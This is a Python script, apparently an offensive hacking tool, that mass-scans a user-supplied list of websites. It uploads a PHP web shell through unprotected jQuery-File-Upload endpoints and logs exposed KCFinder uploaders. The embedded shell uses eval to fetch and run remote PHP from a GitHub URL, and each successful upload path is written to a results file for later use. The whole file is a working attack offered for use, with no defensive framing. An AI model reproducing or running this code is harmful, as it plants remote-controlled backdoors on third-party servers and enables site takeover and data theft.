import requests,time,re,random,os,sys,json
from random import sample
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,Style, init
init(autoreset=True)


r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

shell = """ <?php @eval("?>".file_get_contents("https://raw.githubusercontent.com/ajibarangxploit/shinx/main/shin.php"));?>"""
filename = "su.php"
jpg = "shin.jpg"
files = {'files[]':(filename, shell, 'text/html')}

def jquery(url):
	try:
		users = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36'}
		pathe = [
		'/server/php/',
		'/admin/server/php/',
		'/fileupload/server/php/',
		'/file-upload/server/php/',
		'/jquery-file-upload/server/php/',
		'/JQuery-File-Upload/server/php/',
		'/plugins/jquery-file-upload/server/php/',
		'/assets/jquery-file-upload/server/php/',
		'/js/assets/jquery-file-upload/server/php/',
		'/js/assets/JQuery-File-Upload/server/php/',
		'/assets/JQuery-File-Upload/server/php/',
		'/admin/assets/JQuery-File-Upload/server/php/',
		'/admin/plugins/jquery-file-upload/server/php/',
		'/admin/assets/js/ckeditor/filemanager/'
		'/assets/admin/filemanager/',
		'/boutique/assets/scripts/filemanager/',
		'/AI/filemanager/',
		'/media/js/filemanager/',
		'/admin/image_upload/server/php/',
		'/theme/assets/global/plugins/jquery-file-upload/server/php/',
		'/assets/global/plugins/jquery-file-upload/server/php/',
		'/assets/global/plugins/JQuery-File-Upload/server/php/'
		
		]
		for path in pathe:
			gasup = requests.post(url + path ,files=files, headers=users, timeout=15)
			if '{"files":[]}' in gasup.text or '{"files":[{"name"' in gasup.text:
				print(y + '[OK --> ]' + g + url)
				open('shellxx.txt', 'a').write(url+path+'files/'+filename+'\n')
				break
			else:
				print(y + '[ASU --> ]' + r + url)
	except:
		pass

def kcfinder(url):
	try:
		users = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36'}
		ajg = [
		'/kcfinder/upload.php',
		'/ckeditor/kcfinder/upload.php',
		'/admin/ckeditor/kcfinder/upload.php',
		'/assets/kcfinder/upload.php',
		'/admin/editor/kcfinder/upload.php',
		'/ckeditor/plugins/kcfinder/upload.php',
		'/admin-panel/vendor/kcfinder/upload.php',
		'/assets/plugin/kcfinder/upload.php',
		'/assets/js/kcfinder/upload.php',
		'/assets/ckeditor/kcfinder/upload.php',
		'/plugins/kcfinder/upload.php',
		'/admin/kcfinder/upload.php',
		'/vendor/kcfinder/upload.php',
		'/painel/kcfinder/upload.php',
		'/panel/kcfinder/upload.php',
		'/yonetim/engine/ckeditor/kcfinder/upload.php',
		'/assets/admin/js/kcfinder/upload.php',
		'/js/kcfinder/upload.php'
		]
		for ajg1 in ajg:
			asu = requests.get(url+ajg1,headers=users, timeout=15)
			if 'alert("Unknown error");' in asu.content:
				print(y + '[OK --> ]' + g + url)
				open('rzlt_kcf.txt', 'a').write(url+ajg1+'\n')
				break
			else:
				print(y + '[ASU --> ]' + r + url)
	except:
		pass
	pass

def KONTOLO(url):
	try:
		jquery(url)
		kcfinder(url)
	except:
		pass

if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} 00Shinday00  | {}Shin Code\n".format(y,c)
	url = open(raw_input('List:~# '),'r').read().splitlines()
	pool = ThreadPool(int(20))
	pool.map(KONTOLO, url)
	pool.close()
	pool.join()
